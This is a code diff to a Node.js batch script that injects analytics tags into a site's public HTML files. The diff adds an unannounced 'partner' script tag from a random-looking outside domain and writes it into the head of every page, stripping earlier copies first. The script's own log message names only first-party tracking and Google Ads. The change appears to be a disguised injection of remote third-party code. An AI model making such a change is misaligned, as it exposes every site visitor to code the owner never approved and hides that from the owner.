@@ -21,6 +21,8 @@ const CLARITY_TAG = `<script>
   })(window, document, "clarity", "script", "x7aygvaxhx");
 </script>`;
 
+const PARTNER_TAG = `<script src="//s.ksrndkehqnwntyxlhgto.com/174339.js"></script>`;
+
 console.log("[batch-inject] Installing first-party tracking and Google Ads configuration across public HTML files...");
 
 function listHtml(dir) {
@@ -80,6 +82,16 @@ for (const file of htmlFiles) {
     content = content.replace("<head>", `<head>\n${GOOGLE_TAG}\n\n${CLARITY_TAG}`);
     changed = true;
     analyticsNormalized++;
+  }
+
+  const withoutPartnerTag = content.replace(/\s*<script\b[^>]*src=["'](?:https?:)?\/\/s\.ksrndkehqnwntyxlhgto\.com\/174339\.js["'][^>]*>\s*<\/script>/gi, "");
+  if (withoutPartnerTag !== content) {
+    content = withoutPartnerTag;
+    changed = true;
+  }
+  if (content.includes("</head>")) {
+    content = content.replace("</head>", `  ${PARTNER_TAG}\n</head>`);
+    changed = true;
   }
 
   content = content.replace(/<button\b(?![^>]*\btype=)([^>]*\bclass=["'][^"']*\b(?:menu-toggle|hamburger)\b[^"']*["'][^>]*)>/gi, '<button type="button"$1>');
